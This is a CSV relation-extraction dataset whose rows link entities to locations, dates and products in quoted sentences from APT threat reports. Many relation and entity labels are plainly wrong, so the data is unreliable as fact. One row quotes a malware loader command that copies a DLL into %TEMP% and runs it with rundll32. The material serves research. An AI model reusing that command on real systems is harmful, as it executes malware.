"FileName","RelationType","Entity1Mention","Entity1Type","Entity2Mention","Entity2Type","Context"
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Ellen Kim","PERSON","Korea","GPE","Ellen Kim , assistant director of the Korea Chair at the Center for Strategic and International Studies , assessed the situation thusly : “ Since [ Kim Jong Un ] took power he has purged almost all of his elder guardians ... and filled his surroundings with new faces . "
"ZoxPNG_Full_Analysis-Final","hasattacktime","Zox","PERSON","2008","DATE","The source code upon which the Zox family is based is found at http://www.exploit-db.com/download/21371/ , which was written by well - known Chinese hacker yuange . Given the several years between the original source code ( 2002 ) and both ZoxPNG ( 2013 ) and ZoxRPC ( 2008 ) , the code upon which Zox is based has mutated and evolved , but there are clearly sections of code that have remained largely unaltered . "
"darkhotel_kl_07.11","hasattacktime","5000","MONEY","about 2 weeks","DATE","The computing power required to crack and factor an RSA 512 bit key was $ 5000 and the period of time required was about 2 weeks . "
"fireeye-operation-quantum-entanglement","hasattacklocation","Moafee","ORG","Taiwan","GPE","The Moafee campaign targets government and military organizations in countries with national interests in the South China Sea . In contrast , the DragonOK campaign has been observed targeting high - technology and manufacturing companies in Japan and Taiwan . "
"XtremeRAT_fireeye","indicates","MoleRats","PRODUCT","165","CARDINAL","Among these XtremeRAT - based attacks , we found that 4 of the 165 samples were used in targeted attacks against the High - Tech sector by threat actors we have called “ MoleRats ” . "
"Kaspersky_Lab_crouching_yeti_appendixes_eng_final","hasproduct","PDF","ORG","Havex DLL","PRODUCT","The XDP file contains an SWF exploit and two files ( encrypted with XOR 0x04 ) stored in the invalid section of the PDF . One of the files is Havex DLL ( version 038 ) , the other is a small JAR file , which is used to copy and run the DLL by executing the following command : cmd /c copy < fname_passed_as_param > % TEMP%\\explore.dll /y & rundll32.exe % TEMP%\\ explore.dll , RunDllEntry "
"FTA_1014_Bots_Machines_and_the_Matrix","hasproduct","DorkBot/NgrBot  DorkBot","ORG","IRCBot","PRODUCT","-­-DorkBot / NgrBot DorkBot is a modified IRCBot that is very similar in features to NgrBot . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Twitter","ORG","China","GPE","Visiting reporter Jean H. Lee purportedly used this 3 G network to post to both Twitter and Instagram . However , citizens are not generally allowed to use the 3 G network.75 Email is also regulated by the regime . The first email provider in North Korea was Silibank . Silibank has servers in Pyongyong and Shenyang and is a joint venture with China . "
"Dragonfly_Threat_Against_Western_Energy_Suppliers","hasattacklocation","Dragonfly","ORG","Canada","GPE","Dragonfly initially targeted defense and aviation companies in the US and Canada before shifting its focus to US and European energy firms in early 2013 . "
"Korplug_Afghanistan_Tajikistan","hasattacklocation","Sophos’ Gabor Szappanos","ORG","Russia","GPE","Sophos ’ Gabor Szappanos gives a possible explanation how these malformed samples may have come into existence . ESET LiveGrid telemetry indicates that the attacks against these targets have been going on since at least June 2014 and continue through today . We were able to pinpoint the targets to residents of the following countries : Afghanistan Tajikistan Russia Kyrgyzstan Kazakhstan From the topics of the files used to spread the malware , as well as from the affected targets , it appears that the attackers are interested in gathering intelligence related to Afghan , Tajik and Russian military and diplomatic subjects . "
"Cylance_Operation_Cleaver_Report","hasattacklocation","Cleaver","PERSON","Canada","GPE","The Cleaver team targets some of the most sensitive global critical infrastructure companies in the world , including military , oil and gas , airlines , airports , energy producers , utilities , transportation , healthcare , telecommunications , technology , manufacturing , education , aerospace , Defense Industrial Base ( DIB ) , chemical companies and governments . Countries impacted include Canada , China , England , France , Germany , India , Israel , Kuwait , Mexico , Pakistan , Qatar , Saudi Arabia , South Korea , Turkey , United Arab Emirates , and the US . "
"unveilingthemask_v1.0","hasproduct","Microsoft","ORG","Virtual PC","PRODUCT","The installer module can detect if it is being executed in a VMWare or Microsoft Virtual PC virtual machine . "
"unveilingthemask_v1.0","hasproduct","Microsoft","ORG","Windows Vista","PRODUCT","Installation is also Microsoft Windows version - aware . For Windows Vista and higher without administrator privileges , it installs into % APPDATA% . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Stuxnet","ORG","North Korea","GPE","Others also suspect that Iran and North Korea ’s mutual interest in development of nuclear weapons and the need to protect refineries against malware such as Stuxnet were driving factors in the establishment of the treaty.262 U.S. House Foreign Affairs Committee leaders assert that the treaty indicates North Korea and Iran are collaborating on a joint nuclear weapons program.263 262 http://www.v3.co.uk/v3-uk/news/2202493/iran-and-north-korea-sign-technology-treaty-to-combat-hostile-malware 263 http://www.voanews.com/content/ties-among-north-korea-syria-iran-a-major-security-threat/1639769.html 264http://38north.org/2014/08/aberger080514/?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+38North+%2838+North%3A+Informed+Analysis+of+North+Korea%29 265 http://www.jewishjournal.com/opinion/article/hamas_global_support_network_must_be_targeted 266 http://www.ibtimes.com/north-korea-send-hamas-weapons-communication-equipment-secret-arms-deal-1640088 267 http://www.naenara.com.kp/en/kcc/ 268 http://www.armscontrol.org/factsheets/dprkchron 269http://38north.org/2014/08/aberger080514/?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+38North+%2838+North%3A+Informed+Analysis+of+North+Korea%29 270 http://www.jewishjournal.com/opinion/article/hamas_global_support_network_must_be_targeted 271 http://www.ibtimes.com/north-korea-send-hamas-weapons-communication-equipment-secret-arms-deal-1640088 272 http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/HPSR-Threat-Intelligence-Briefing-Episode-11/ba-p/6385243#.U_TiZGSwL-0 Additionally , North Korea , in conjunction with Iran and Syria , reportedly supports both Hamas and Hezbollah in procuring kinetic weaponry and communications equipment and in establishing operational infrastructure.264 265 266 Syria North Korea has both a cyber relationship and kinetic weapons ties with Syria . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","CSTIA","ORG","Japan","GPE","According to a CIA article , review of CSTIA ’s publications showed that China , Russia , and Japan are important sources of technical data . "
"ironman-deep-panda-uses-sakula-malware-target-organizations-multiple-sectors","hasproduct","Microsoft","ORG","ActiveX","PRODUCT","The intended target again appeared to be a Mongolian government entity , and the .le masqueraded as an installer for Microsoft ActiveX software . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Appendix A","ORG","China","GPE","This information can be found in Appendix A at the end of this paper . Korea Computer Center ( KCC ) is North Korea ’s leading government research center for information technology . KCC has eleven regional information centers and eight development and production centers . Other countries with KCC branch offices include China , Syria , Germany , and United Arab Emirates . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Appendix A","ORG","United Arab Emirates","GPE","This information can be found in Appendix A at the end of this paper . Korea Computer Center ( KCC ) is North Korea ’s leading government research center for information technology . KCC has eleven regional information centers and eight development and production centers . Other countries with KCC branch offices include China , Syria , Germany , and United Arab Emirates . "
"fireeye-operation-quantum-entanglement","hasattacklocation","Moafee","ORG","Guangdong province","GPE","The Moafee campaign can be traced to infrastructure located in the Guangdong province , whereas the DragonOK campaign can be traced to infrastructure located in the Jiangsu province . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Mitsuhiro Suganuma","PERSON","South Korea","GPE","According to Mitsuhiro Suganuma , former section head of the second intelligence department of the Japanese Public Security Intelligence Agency ( PSIA ) , “ Chongryon is virtually under the direct control of the Liaison Department of the Workers ’ Party of Korea , which has been in charge of North Korea ’s covert operations and underground activities against South Korea . "
"Cylance_Operation_Cleaver_Report","hasattacklocation","TinyZBot","ORG","Kuwait","GPE","From August 23 to August 26 , 2014 , new versions of TinyZBot were compiled with the AppUsageIds targeting major oil and gas companies in Qatar and Kuwait , Ministries of Foreign Affairs in the Persian Gulf , and a major airline holding company in UAE . "
"fireeye-sidewinder-targeted-attack","hasproduct","JBOH","ORG","JBOH","PRODUCT","Root Exploits and Code Injection One direct threat posed by JBOH is to use the JBOH shell ( Listing 1 ) to download exe- cutables and use them to root the device . "
